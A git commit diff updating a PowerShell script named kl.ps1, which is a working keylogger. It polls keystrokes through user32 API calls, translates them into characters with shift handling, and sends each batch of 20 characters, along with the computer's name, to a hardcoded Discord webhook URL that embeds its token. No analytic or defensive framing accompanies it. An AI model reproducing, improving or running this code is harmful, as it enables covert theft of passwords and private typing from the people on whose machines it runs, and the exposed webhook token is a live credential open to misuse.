dc3cf12978b39c495721afde944270b029375606
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 00:59:55 +0100

    Update kl.ps1

--- kl.ps1
+++ kl.ps1
@@ -1,24 +1,30 @@
 $webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger natif actif – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
-$code = @'
+Add-Type @'
 using System;
 using System.Runtime.InteropServices;
 public class K {
     [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
+    [DllImport("user32.dll")] public static extern int MapVirtualKey(int uCode, int uMapType);
+    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 2)] System.Text.StringBuilder lpChar, int cchBuff, uint wFlags);
 }
 '@
-
-Add-Type $code
 
 $buf = ''
 while($true){
     Start-Sleep -m 40
     for($i=8;$i -le 254;$i++){
         if([K]::GetAsyncKeyState($i) -eq -32767){
-            $buf += [char]$i
-            if($buf.Length -ge 25){
+            $sb = New-Object System.Text.StringBuilder
+            $shift = [K]::GetAsyncKeyState(0x10) -ne 0
+            [K]::ToUnicode($i, [K]::MapVirtualKey($i,0), (New-Object byte[] 256), $sb, 2, 0) | Out-Null
+            $char = $sb.ToString()
+            if($char.Length -eq 0){ $char = [char]$i }
+            if($shift){ $char = $char.ToUpper() } else { $char = $char.ToLower() }
+            $buf += $char
+            if($buf.Length -ge 20){
                 iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                 $buf = ''
             }
